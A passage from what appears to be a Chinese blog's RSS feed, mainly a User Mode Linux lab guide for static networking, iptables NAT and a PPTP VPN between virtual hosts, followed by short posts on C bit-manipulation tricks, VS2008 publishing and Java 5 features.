<p><span lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style="font-family: 宋体;"  >启动后设置</span><span lang="EN-US"  >clientB1</span><span style="font-family: 宋体;"  >的网络</span><span lang="EN-US"  >, sudo vi /etc/network/interface:</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >auto eth0</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iface eth0 inet static</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>address 192.168.22.3</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>netmask 255.255.255.0</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>gateway 192.168.22.1</span></span></p>  <h3><a name="_Toc277360864" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4.2.5<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span lang="EN-US"  >clientB2</span></a></h3>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >首先从</span><span lang="EN-US"  >hank-fs</span><span style="font-family: 宋体;"  >拷贝一个复本</span><span lang="EN-US"  > cp hank-fs hank-fs-B2</span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >ClientB2</span><span style="font-family: 宋体;"  >有一个网卡</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >连接</span><span lang="EN-US"  >switchB(eth0),</span><span style="font-family: 宋体;"  >因此启动</span><span lang="EN-US"  >clientB2</span><span style="font-family: 宋体;"  >的命令为</span></p>  <p><span lang="EN-US"  >linux ubd0=hank-fs-B2 eth0=daemon,,unix,/tmp/switchB</span></p>  <p><span lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span style="font-family: 宋体;"  >启动后设置</span><span lang="EN-US"  >clientB2</span><span style="font-family: 宋体;"  >的网络</span><span lang="EN-US"  >, sudo vi /etc/network/interface:</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >auto eth0</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iface eth0 inet static</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>address 192.168.22.5</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>netmask 255.255.255.0</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ><span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>gateway 192.168.22.1</span></span></p>  <h2><a name="_Toc277360865" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4.3<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 黑体;"  >实现</span><span lang="EN-US"  >NAT</span></a></h2>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >Server A</span><span style="font-family: 宋体;"  >负责将</span><span lang="EN-US"  >switchA</span><span style="font-family: 宋体;"  >内的工作站连入</span><span lang="EN-US"  >switch1</span><span style="font-family: 宋体;"  >的网络</span><span lang="EN-US"  >.</span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >Server A</span><span style="font-family: 宋体;"  >负责将</span><span lang="EN-US"  >switchA</span><span style="font-family: 宋体;"  >内的工作站连入</span><span lang="EN-US"  >switch1</span><span style="font-family: 宋体;"  >的网络</span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >Host</span><span style="font-family: 宋体;"  >则通过</span><span lang="EN-US"  >tap1</span><span style="font-family: 宋体;"  >将</span><span lang="EN-US"  >switch1</span><span style="font-family: 宋体;"  >内的工作站连入</span><span lang="EN-US"  >host</span><span style="font-family: 宋体;"  >的网络</span></p>  <h3><a name="_Toc277360866" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4.3.1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >设置</span><span lang="EN-US"  >serverA</span></a></h3>  <p><span style="font-family: 宋体;"  >编辑</span><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >的启动脚本</span><span lang="EN-US"  >,sudo vi /etc/rc.local,sudo /etc/rc.local</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -F INPUT</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -F OUTPUT</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -F FORWARD</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -t nat -F POSTROUTING</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -t nat -F PREROUTING</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -t nat -A POSTROUTING -o eth0 -s 192.168.11.0/24 -j MASQUERADE</span></span></p>  <h3><a name="_Toc277360867" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4.3.2<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >设置</span><span lang="EN-US"  >serverB</span></a></h3>  <p><span style="font-family: 宋体;"  >编辑</span><span lang="EN-US"  >serverB</span><span style="font-family: 宋体;"  >的启动脚本</span><span lang="EN-US"  >,sudo vi /etc/rc.local,sudo /etc/rc.local</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -F INPUT</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -F OUTPUT</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -F FORWARD</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -t nat -F POSTROUTING</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -t nat -F PREROUTING</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >iptables -t nat -A POSTROUTING -o eth0 -s 192.168.22.0/24 -j MASQUERADE</span></span></p>  <p><span lang="EN-US"  >&nbsp;</span></p>  <h3><a name="_Toc277360868" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >4.3.3<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >设置</span><span lang="EN-US"  >host</span></a></h3>  <p><span style="font-family: 宋体;"  >有</span><span lang="EN-US"  >host</span><span style="font-family: 宋体;"  >系统上设置</span><span lang="EN-US"  >tap1</span><span style="font-family: 宋体;"  >的转发功能</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >从而使学习网络的所有主机都可以连入互联网</span><span lang="EN-US"  >.</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >#!/bin/bash</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo ifconfig tap1 10.0.0.1 netmask 255.255.255.0</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >echo "echo 1 &gt; /proc/sys/net/ipv4/ip_forward" | sudo sh</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo iptables -F INPUT</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo iptables -F OUTPUT</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo iptables -F FORWARD</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo iptables -t nat -F POSTROUTING</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo iptables -t nat -F PREROUTING</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo iptables -t nat -A POSTROUTING -o eth0 -s 10.0.0.0/24 -j MASQUERADE</span></span></p>  <p style="text-indent: 21pt;"  ><span lang="EN-US"  >&nbsp;</span></p>  </div>  <span style="font-size: 10.5pt; font-family: &quot;Times New Roman&quot;;"  lang="EN-US"  ><br style="page-break-before: always;"  clear="all"  > </span>  <div style=""  >  <h1><a name="_Toc277360869" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >5<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >测试</span></a></h1>  <p><span lang="EN-US"  >&nbsp;</span></p>  <h2><a name="_Toc277360870" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >5.1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 黑体;"  >测试交换机</span></a></h2>  <h3><a name="_Toc277360871" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >5.1.1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >测试</span><span lang="EN-US"  >switch1</span></a></h3>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping serverB, ping 10.0.0.20</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping host, ping 10.0.0.1</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >serverB</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping serverA, ping 10.0.0.10</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >serverB</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping host, ping 10.0.0.1</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >host</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping serverA, ping 10.0.0.10</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping Internet, ping www.baidu.com</span></p>  <h3><a name="_Toc277360872" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >5.1.2<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >测试</span><span lang="EN-US"  >switchA</span></a></h3>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >clientA</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping serverA, ping 192.168.11.3</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping clientA, ping 192.168.11.5</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >clientA</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping serverB, ping 10.0.0.20</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >clientA</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping host, ping 10.0.0.1</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >clientA</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping Internet, ping www.sina.com</span></p>  <h3><a name="_Toc277360873" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >5.1.3<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >测试</span><span lang="EN-US"  >switchB</span></a></h3>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >serverB</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping clientB1, ping 192.168.22.3</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >clientB1</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping serverB, ping 192.168.22.1 </span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >clientB2</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping clientB1, ping 192.168.22.3</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >clientB2</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping serverA, ping 10.0.0.10</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >clientB1</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping host, ping 10.0.0.1</span></p>  <p><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >clientB2</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping Internet, ping www.sina.com</span></p>  <h2><a name="_Toc277360874" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >5.2<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 黑体;"  >测试</span><span lang="EN-US"  >NAT</span></a></h2>  <h3><a name="_Toc277360875" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >5.2.1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span lang="EN-US"  >clientA</span></a></h3>  <p><span lang="EN-US"  >clientA-serverB</span></p>  <p><span lang="EN-US"  >clientA-host</span></p>  <p><span lang="EN-US"  >clientA-internet</span></p>  <h3><a name="_Toc277360876" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >5.2.2<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span lang="EN-US"  >clientB</span></a></h3>  <p><span lang="EN-US"  >clientB1-serverA</span></p>  <p><span lang="EN-US"  >clientB1-host</span></p>  <p><span lang="EN-US"  >clientB2-internet</span></p>  <h2><a name="_Toc277360877" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >5.3<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 黑体;"  >高级测试</span></a></h2>  <h3><a name="_Toc277360878" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >5.3.1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >测试</span><span lang="EN-US"  >VPN</span></a></h3>  <p style="text-indent: 21pt;"  >  </p><div style=""  >  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >例如我们想让</span><span lang="EN-US"  >clientB</span><span style="font-family: 宋体;"  >连入</span><span lang="EN-US"  >switchA</span><span style="font-family: 宋体;"  >的网络</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >可以在</span><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >上安装</span><span lang="EN-US"  >pptpd</span><span style="font-family: 宋体;"  >服务</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >clientB</span><span style="font-family: 宋体;"  >上安装</span><span lang="EN-US"  >pptp</span><span style="font-family: 宋体;"  >客户端</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >然后</span><span lang="EN-US"  >clientB</span><span style="font-family: 宋体;"  >就可以访问</span><span lang="EN-US"  >switchA</span><span style="font-family: 宋体;"  >内的工作站了</span></p>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >首先在</span><span lang="EN-US"  >clientB1</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping clientA, </span><span style="font-family: 宋体;"  >不能</span><span lang="EN-US"  >ping</span><span style="font-family: 宋体;"  >通</span><span lang="EN-US"  >, </span><span style="font-family: 宋体;"  >接下来开始配置</span><span lang="EN-US"  >VPN</span></p>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >首先在</span><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >上配置</span><span lang="EN-US"  >VPN</span><span style="font-family: 宋体;"  >服务器</span><span lang="EN-US"  >:</span></p>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >在</span><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >, sudo apt-get install pptpd, </span><span style="font-family: 宋体;"  >然后配置分配的</span><span lang="EN-US"  >IP</span><span style="font-family: 宋体;"  >和用户帐户</span><span lang="EN-US"  >:</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo vi /etc/pptpd.conf</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >localip: 192.168.11.20</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >remoteip: 192.168.11.21-29</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo vi /etc/ppp/chap-secrets</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >hankjin<span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>*<span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>hjz<span style=""  >&nbsp;&nbsp;&nbsp;&nbsp; </span>*</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo /etc/init.d/pptpd restart</span></span></p>  <p><span lang="EN-US"  >&nbsp;</span></p>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >然后在</span><span lang="EN-US"  >clientB1</span><span style="font-family: 宋体;"  >上配置</span><span lang="EN-US"  >VPN</span><span style="font-family: 宋体;"  >客户端</span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo apt-get install pptp-linux</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo vi /etc/ppp/chap-secrets</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >hankjin<span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>mypptp<span style=""  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>hjz<span style=""  >&nbsp;&nbsp;&nbsp;&nbsp; </span>*</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo vi /etc/ppp/peers/myserver</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >pty "pptp  10.0.0.10 --nolaunchpppd"</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >#mppe required,stateless</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >name hankjin</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >remotename mypptp</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >&nbsp;</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >require-pap</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >refuse-mschap</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >require-mschap-v2</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >require-mppe-128</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >proxyarp</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >lock</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >nobsdcomp</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >novj</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >novjccomp</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >nologfd</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >debug</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >#ipparam pptp:XXXX</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >&nbsp;</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  ># do not require the server to authenticate to our client</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >noauth</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >&nbsp;</span></span></p>  <p><span><span style="font-size: 9pt;"  lang="EN-US"  >persist</span></span></p>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >最后在</span><span lang="EN-US"  >clientB1</span><span style="font-family: 宋体;"  >上连接</span><span lang="EN-US"  >serverA</span><span style="font-family: 宋体;"  >的</span><span lang="EN-US"  >pptpd</span><span style="font-family: 宋体;"  >服务</span></p>  <p style="text-indent: 21pt;"  ><span><span style="font-size: 9pt;"  lang="EN-US"  >sudo pppd call myserver</span></span></p>  <p style="text-indent: 21pt;"  ><span><span style="font-size: 9pt;"  lang="EN-US"  >ifconfig</span></span></p>  <p style="text-indent: 21pt;"  ><span style="font-family: 宋体;"  >如果发现</span><span lang="EN-US"  >ppp0</span><span style="font-family: 宋体;"  >连接</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >表示</span><span lang="EN-US"  >VPN</span><span style="font-family: 宋体;"  >服务创建成功</span><span lang="EN-US"  >,</span><span style="font-family: 宋体;"  >然后从</span><span lang="EN-US"  >clientB1</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping clientA</span><span style="font-family: 宋体;"  >成功</span><span lang="EN-US"  >. </span><span style="font-family: 宋体;"  >从</span><span lang="EN-US"  >clientA</span><span style="font-family: 宋体;"  >上</span><span lang="EN-US"  >ping clientB1</span><span style="font-family: 宋体;"  >也成功</span><span lang="EN-US"  >, clientB1</span><span style="font-family: 宋体;"  >已经成功潜入</span><span lang="EN-US"  >switchA</span><span style="font-family: 宋体;"  >的网络</span><span lang="EN-US"  >.</span></p>  </div>  <b><span style="font-size: 22pt; line-height: 240%; font-family: &quot;Times New Roman&quot;;"  lang="EN-US"  ><br style="page-break-before: always;"  clear="all"  > </span></b>  <h1><a name="_Toc277360879" rel="nofollow"  ><span style=""  lang="EN-US"  ><span style=""  >1<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >常见错误</span></a></h1>  <p style="margin-left: 18pt; text-indent: -18pt;"  ><span style=""  lang="EN-US"  ><span style=""  >1)<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >创建文件系统失败</span></p>  <p style="margin-left: 18pt; text-indent: -18pt;"  ><span style=""  lang="EN-US"  ><span style=""  >2)<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span style="font-family: 宋体;"  >连接网络失败</span></p>  <p style="margin-left: 18pt; text-indent: -18pt;"  ><span style=""  lang="EN-US"  ><span style=""  >3)<span style="font: 7pt &quot;Times New Roman&quot;;"  >&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="EN-US"  >NAT</span><span style="font-family: 宋体;"  >转换失败</span></p><span style="font-family: 宋体;"  ></span><span lang="EN-US"  ></span><span style="font-family: 宋体;"  ></span><span lang="EN-US"  ></span><span style=""  ></span></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201010129263187/</guid>
    </item>
    <item>
      <title>
<![CDATA[神奇的位运算]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201011145450935/</link>
      <description>
<![CDATA[1。计算一个整数的二进制中1的个数<br>2。计算一个整数的二进制中末尾0的个数<br><code>3。判断一个整数是否是2的n次幂</code><br><code>4。计算比一个整数大的最小的2的n次幂</code><br>5。交换两个整数<br>6。计算一个整数的绝对值<br>7。<span style="font-family: monospace;">计算两个整数中的较小值和较大值</span><br><b>计算一个整数的二进制中1的个数</b><br>unsigned int v; // 整数<br>unsigned int c; // 运算结果<br>for (c = 0; v; c++){<br>&nbsp;&nbsp;&nbsp; v &amp;= (v - 1); // 清空最低的1比特位，v&amp;-v即是最低的比特位，所以这句也可以写成v-=(v&amp;-v)<br>}<br><b>计算一个整数的二进制中末尾0的个数</b><br><wbr><code>unsigned int v;&nbsp;&nbsp;// 整数<br>
int r;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 运算结果<br>
static const int MultiplyDeBruijnBitPosition[32] ={<br>
&nbsp;&nbsp;0, 1, 28, 2, 29, 14, 24, 3, 30, 22, 20, 15, 25, 17, 4, 8,<br>
&nbsp;&nbsp;31, 27, 13, 23, 21, 19, 16, 7, 26, 12, 18, 6, 11, 5, 10, 9<br>
};<br>
r = MultiplyDeBruijnBitPosition[((uint32_t)((v &amp; -v) * 0x077CB531U)) &gt;&gt; 27];<br>复杂度O(c)5步<br></code><code>神奇的</code><code>0x077CB531U与</code><code>MultiplyDeBruijnBitPosition数组<br><b>判断一个整数是否是2的n次幂<br></b>unsigned int v;<br>bool ispow = (v&amp;(v-1))==0<b>;<br>计算比一个整数大的最小的2的n次幂<br></b>例如比9大的最小的2的n次幂是16，比7大的2最小的2的n次幂是8<br>unsigned int v; //整数<br>v--;<br>v |= v&gt;&gt;1;<br></code><code>v |= v&gt;&gt;2;<br></code><code>v |= v&gt;&gt;4;<br></code><code>v |= v&gt;&gt;8;<br></code><code>v |= v&gt;&gt;16;<br>v++;<br><b>交换两个整数<br></b>#define SWAP(a,b) ((a^=b),(b^=a),(a^=b))<br><b>计算一个整数的绝对值</b><br>int v;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 一个整数<br>unsigned int r; // 结果<br>int const mask = v&gt;&gt; sizeof(int) * CHAR_BIT - 1;<br>r = (v+mask)^mask;</code><span style="font-family: monospace;"><br><b>计算两个整数中的较小值和较大值</b><br>int x, y;<br>int r;<br>r = y ^ ((x^y) &amp; -(x&lt;y)); // min(x,y)<br>r = x ^ ((x^y) &amp; -(x&lt;y)); // max(x,y)<br></span>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Math</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201011145450935/</guid>
    </item>
    <item>
      <title>
<![CDATA[VS2008.Net发布应用程序]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720092235384685/</link>
      <description>
<![CDATA[1. 安装IIS<br>2. 打开解决方案<br>3. Build-&gt;Publish<br>然后就可以从浏览器安装运行了, 安装完毕后会在程序菜单生成快捷方式, 而且每次程序启动都会自动检查是否有新版本, 如果有新版本会提示是否要更新.<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720092235384685/</guid>
    </item>
    <item>
      <title>
<![CDATA[java5(Tiger)的新功能Tiger]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720095573854777/</link>
      <description>
<![CDATA[1. 强大的Arrays <br>格式化输出数组： 一维数组Arrays.toString(x[]),&nbsp; 多维数组Arrays.deepToString(x[][][][]...)<br>深比较数组： 一维数组Arrays.equals(), 多维数组Arrays.deepEquals(,);<br><br>2. 重载返回类型可以改变, 但是要求新的返回类型必须继承自原来的返回类型。 这个特性貌似是C#没有的<br>xA extends A<br>class B{ A f();}<br>class xB extends B{ xA f();}<br><br>3.加入StringBuilder（非线程安全），代替StringBuffer（线程安全）<br>可以看出sun的策略，命名越来越正规，线程安全要求越来越松散：<br>原来的Hashtable是线程安全的，新的HashMap是非线程安全的；原来的Vector是线程安全的，新的ArrayList不是线程安全的。<br><br>4.重量级的特性：泛型，以及随之而来的vararg, annotation, enumeration collection<br>enum -&gt; EnumMap -&gt; EnumSet -&gt;Enum method<br><br>5. boxing unboxing<br>Integer i = 200, j = 200, a = 20, b = 20;<br>i==j;//false<br>a==b;//true<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720095573854777/</guid>
    </item>
    <item>
      <title>
<![CDATA[Haskell程序集]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720101113247379/</link>
      <description>
